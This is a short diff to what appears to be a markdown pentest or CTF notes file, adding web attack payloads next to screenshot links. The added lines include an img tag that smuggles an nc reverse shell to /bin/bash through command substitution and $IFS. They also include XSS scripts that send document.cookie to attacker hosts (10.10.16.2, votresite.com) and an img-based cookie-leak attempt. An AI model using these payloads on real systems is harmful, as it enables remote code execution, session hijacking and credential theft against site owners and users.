@@ -38,9 +38,13 @@ spx,txt``
 ![image](https://user-images.githubusercontent.com/123066149/222885186-d35f0e8f-99ea-4de2-9793-959ec4bdd345.png)
 
 ``azeazeaz<h1>MONKMODE</h1>zeeaze``
+
 ``<img src=http://10.10.16.2:800/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.16.2'$IFS'2222')>``
+
 ``<script> window.open(‘http://10.10.16.2:800/xss.php?a=’+document.cookie) </script>``
+
 ``<script> window.open(‘http://votresite.com/xss.php?a=’+document.cookie) </script>``
+
 ``<img src=http://10.10.16.2:800/?cookie='+document.cookie)>``
 
 ![ssrf](https://user-images.githubusercontent.com/123066149/222884580-628295fc-cbd2-4641-bada-5f93810077c1.PNG)
